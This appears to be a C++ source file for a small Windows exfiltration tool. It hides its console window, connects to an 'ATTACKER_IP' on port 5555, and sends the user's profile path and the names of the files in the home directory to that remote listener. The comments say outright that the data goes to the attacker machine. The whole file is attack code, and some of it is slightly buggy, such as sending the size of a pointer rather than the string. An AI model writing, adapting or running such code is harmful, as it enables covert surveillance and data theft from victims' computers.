/* we use winsock utilities and we do not want the compiler to complain about older functionalities used, since the
below code is sufficient for our needs. */
#define _WINSOCK_DEPRECATED_NO_WARNINGS 
// We need the Ws2_32.lib library in order to use sockets (networking)
#pragma comment(lib, "Ws2_32.lib") 

/* now comes headers which provide various utilities for our program: */

// Standard input/output utilities
#include <iostream> 

// Networking utilities
#ifdef _WIN32
#include <Winsock2.h>
#endif

// Standard input/output utilities
#include <stdio.h> 

// Standard input/output utilities
#include <stdlib.h> 

// Directory utilities
#include <dirent.h> 

// String utilities
#include <string> 

#include <Windows.h>

// Char* returns pointer to a string
char* userDirectory() 
{
// Pointer Path
    char* pPath;
    pPath = getenv ("USERPROFILE");

    if (pPath != NULL)
    {
        return pPath;

    }else {
        perror(""); /* For errors */
    }
}

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE); /* Hide program window */

    WSADATA WSAData;

    SOCKET server;

    SOCKADDR_IN addr;

    WSAStartup(MAKEWORD(2, 0), &WSAData);

    server = socket(AF_INET, SOCK_STREAM, 0);

    addr.sin_addr.s_addr = inet_addr("ATTACKER_IP"); /* SPECIFICY THE ATTACKER IP */
    addr.sin_family = AF_INET; /* set address family (AF) to AF_INET (IPv4) */
    addr.sin_port = htons(5555); /* SPECIFY ATTACKER LISTENING PORT */ 

    connect(server, (SOCKADDR *)&addr, sizeof(addr)); //connect to the previously set up target host/port

    char* pPath = userDirectory(); // new local variable

    send(server, pPath, sizeof(pPath), 0); // sent to attacker machine

    DIR *dir; // new variable named dir: pointer to DIR
    struct dirent *ent; // new variable named ent: pointer to structure

    if ((dir = opendir (pPath)) != NULL) {

        while ((ent = readdir (dir)) != NULL){

            send(server, ent->d_name, sizeof(ent->d_name), 0); // sends name of current item(file or directory) to attacker

        }
        closedir (dir); //close the directory that was read

    }else {
        perror ("");

    }

    closesocket(server); //closes the socket
    WSACleanup(); // clean up the Winsock library components
    

}